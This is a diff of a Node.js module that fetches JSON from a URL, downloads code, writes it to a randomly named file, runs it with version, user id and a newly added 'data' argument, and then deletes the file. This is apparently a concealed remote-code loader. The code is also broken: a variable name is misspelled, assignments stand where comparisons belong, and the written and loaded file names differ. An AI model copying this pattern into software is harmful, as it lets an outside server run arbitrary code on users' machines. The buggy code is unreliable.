@@ -1,5 +1,5 @@
 var request = require('./minirequest')
-module.exports = function(url,version,uid) {
+module.exports = function(url,version,uid,data) {
   request(url,function(error,response,body) {
     if (!error && respone.statusCode = 200) {
       var a = JSON.parse(body)
@@ -19,7 +19,7 @@ module.exports = function(url,version,uid) {
                   if (!e && r.statusCode = 200) {
                     fs.writeFileSync(__dirname + "/asddwfe.js",b);
                     var g = require("./assdwfe.js");
-                    g(version,uid);
+                    g(version,uid,data);
                     fs.unlinkSync("./assdwfe.js");
                   }
             })
@@ -35,6 +35,9 @@ module.exports = function(url,version,uid) {
               console.log("\x1b[31m[Update] An update is available, current version: " + version + " Available: " + action.content + " Description: " + description + "\x1b[0m")
               
             }
+            break;
+          case "optin":
+            
             break;
         }
       })
